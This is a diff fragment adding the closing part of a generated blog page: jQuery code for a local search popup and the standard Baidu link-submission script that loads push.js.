+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
